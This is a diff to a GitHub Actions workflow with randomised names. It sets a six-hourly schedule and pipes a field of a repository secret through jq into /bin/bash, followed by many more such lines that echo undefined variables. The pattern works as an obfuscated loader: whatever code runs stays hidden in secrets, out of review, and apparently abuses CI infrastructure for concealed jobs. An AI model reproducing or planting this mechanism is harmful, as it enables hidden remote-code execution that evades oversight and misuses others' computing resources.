@@ -1,9 +1,8 @@
 name: zonxxki
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 1/6 * * *'
+    - cron: '11 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,21 +10,24 @@ jobs:
       - uses: actions/checkout@v4
       - name: zonxxki
         env:
-          rtcny23181: ${{ secrets.rtcny23181 }}
+          pgw0: ${{ secrets.pgw0 }}
         run: |
-          echo $rtcny23181 | jq -r .vxyt4524 | /bin/bash
-          echo $xtmbr7 | jq -r .lprm819 | /bin/bash
-          echo $smo9 | jq -r .rnji622 | /bin/bash
-          echo $lxat2 | jq -r .wof37 | /bin/bash
-          echo $zccr2605 | jq -r .eu6 | /bin/bash
-          echo $mv0 | jq -r .xn418 | /bin/bash
-          echo $elk93 | jq -r .h067 | /bin/bash
-          echo $r1 | jq -r .zsl799 | /bin/bash
-          echo $anr608 | jq -r .ek64 | /bin/bash
-          echo $jr740 | jq -r .rinpu85269 | /bin/bash
-          echo $pjc37 | jq -r .ndee42465 | /bin/bash
-          echo $neg035 | jq -r .rhbi94 | /bin/bash
-          echo $nfk24 | jq -r .xlrxe69 | /bin/bash
-          echo $rv94723 | jq -r .j4 | /bin/bash
-          echo $fgkwu5 | jq -r .ftw86 | /bin/bash
+          echo $pgw0 | jq -r .agyym11760 | /bin/bash
+          echo $uqvf85821 | jq -r .nkn05 | /bin/bash
+          echo $gbzm4692 | jq -r .xzxx6575 | /bin/bash
+          echo $d7 | jq -r .y0265 | /bin/bash
+          echo $oczxm3055 | jq -r .id46 | /bin/bash
+          echo $xkle72181 | jq -r .yja74302 | /bin/bash
+          echo $yir36538 | jq -r .q49878 | /bin/bash
+          echo $qs42267 | jq -r .nvskq1 | /bin/bash
+          echo $s3 | jq -r .i51222 | /bin/bash
+          echo $xvln5196 | jq -r .biw0989 | /bin/bash
+          echo $wv5 | jq -r .rye163 | /bin/bash
+          echo $ig59 | jq -r .ek6913 | /bin/bash
+          echo $htx482 | jq -r .ad71952 | /bin/bash
+          echo $fqzmb888 | jq -r .sn6957 | /bin/bash
+          echo $rne656 | jq -r .g91 | /bin/bash
+          echo $m379 | jq -r .kdco36 | /bin/bash
+          echo $dnwuj9 | jq -r .vszm78 | /bin/bash
+          echo $y8910 | jq -r .odg8755 | /bin/bash
 
